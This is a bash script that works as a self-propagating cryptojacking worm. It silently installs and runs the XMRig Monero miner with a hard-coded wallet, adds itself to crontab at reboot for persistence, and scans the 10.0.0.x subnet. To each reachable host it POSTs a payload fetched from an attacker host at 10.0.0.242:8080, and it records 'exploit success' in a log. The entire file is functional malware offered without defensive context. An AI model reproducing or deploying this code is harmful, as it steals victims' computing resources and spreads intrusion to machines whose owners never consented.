#!/bin/bash

# Configuration
POOL_URL="wss://webminer.moneroocean.stream:443"
WALLET_ADDRESS="4ADHEMYrLqrHQvaQNVoKh28Vt6gttrckp2kfum6eYWK7FWbmRjFT7rzacpbr6MiXYMMBUxFcGpYor2i2jgQKTZiMZ4QwBjop9"
ATTACKER_IP="10.0.0.242"
ATTACKER_PORT="8080"
LOG_FILE="/var/log/miner.log"
SUCCESS_LOG="exploit_success_log.txt"

# Detect available cores
TOTAL_CORES=$(nproc)
LOW_CORES=$(( (TOTAL_CORES * 10 + 99) / 100 ))  # 10% of cores, rounded up
MEDIUM_CORES=$(( (TOTAL_CORES * 30 + 99) / 100 ))  # 30% of cores, rounded up
HIGH_CORES=$(( (TOTAL_CORES * 50 + 99) / 100 ))  # 50% of cores, rounded up

# Resource mode configurations
declare -A MODE_CONFIGS
MODE_CONFIGS["low"]="cores=${LOW_CORES:-1} nice=15 threads=1 delay=5"
MODE_CONFIGS["medium"]="cores=${MEDIUM_CORES:-1} nice=10 threads=3 delay=2"
MODE_CONFIGS["high"]="cores=${HIGH_CORES:-1} nice=5 threads=5 delay=1"

# Logging function
log() {
    echo "$(date '+%Y-%m-%d %H:%M:%S') - $1" >> "$LOG_FILE"
}

# Log exploit success
log_exploit_success() {
    local target=$1
    local mode=$2
    local status=$3
    echo "$(date '+%Y-%m-%d %H:%M:%S') - Propagation to $target: $status (Mode: $mode)" >> "$SUCCESS_LOG"
}

# Install miner
install_miner() {
    local mode=$1
    local config=${MODE_CONFIGS[$mode]}
    eval "$config"

    log "Starting miner in $mode mode"
    if ! command -v xmrig >/dev/null 2>&1; then
        log "Installing miner in $mode mode (cores=$cores, nice=$nice)"
        curl -s -L https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz -o xmrig.tar.gz
        tar -xzf xmrig.tar.gz
        mv xmrig-6.21.0/xmrig /usr/local/bin/xmrig
        rm -rf xmrig.tar.gz xmrig-6.21.0
    fi

    # Start miner
    if command -v taskset >/dev/null 2>&1; then
        taskset -c 0-$((cores-1)) nice -n "$nice" xmrig -o "$POOL_URL" -u "$WALLET_ADDRESS" -k --coin monero -t "$cores" >/dev/null 2>&1 &
    else
        nice -n "$nice" xmrig -o "$POOL_URL" -u "$WALLET_ADDRESS" -k --coin monero -t "$cores" >/dev/null 2>&1 &
    fi
    log "Miner started with $cores cores, nice $nice"
}

# Ensure persistence
ensure_persistence() {
    local mode=$1
    log "Ensuring persistence in $mode mode"
    (crontab -l 2>/dev/null | grep -v "$0"; echo "@reboot bash $0 --mode $mode") | crontab -
}

# Propagate to other systems
propagate() {
    local mode=$1
    local config=${MODE_CONFIGS[$mode]}
    eval "$config"

    log "Propagating in $mode mode (delay=${delay}s, threads=$threads)"
    local base_ip="10.0.0"
    for i in {1..255}; do
        local target="${base_ip}.${i}"
        if [ "$target" != "$(hostname -I | awk '{print $1}')" ]; then
            (
                curl -s -m 5 "http://${target}:80" >/dev/null
                if [ $? -eq 0 ]; then
                    curl -s -X POST "http://${target}:80/submit" -d "data=$(curl -s http://${ATTACKER_IP}:${ATTACKER_PORT}/miner.sh | base64)" >/dev/null
                    if [ $? -eq 0 ]; then
                        log "Successfully propagated to $target"
                        log_exploit_success "$target" "$mode" "Success"
                    else
                        log "Failed to propagate to $target"
                        log_exploit_success "$target" "$mode" "Failure"
                    fi
                fi
            ) &
            (( $(jobs -r | wc -l) >= threads )) && wait -n
        fi
        sleep "${delay}"
    done
    wait
}

# Main
main() {
    local mode="medium"
    while [[ $# -gt 0 ]]; do
        case $1 in
            --mode)
                mode=$2
                shift 2
                ;;
            *)
                echo "Unknown option: $1"
                exit 1
                ;;
        esac
    done

    if [[ ! ${MODE_CONFIGS[$mode]} ]]; then
        echo "Invalid mode: $mode. Use low, medium, or high."
        exit 1
    fi

    install_miner "$mode"
    ensure_persistence "$mode"
    propagate "$mode"
}

main "$@"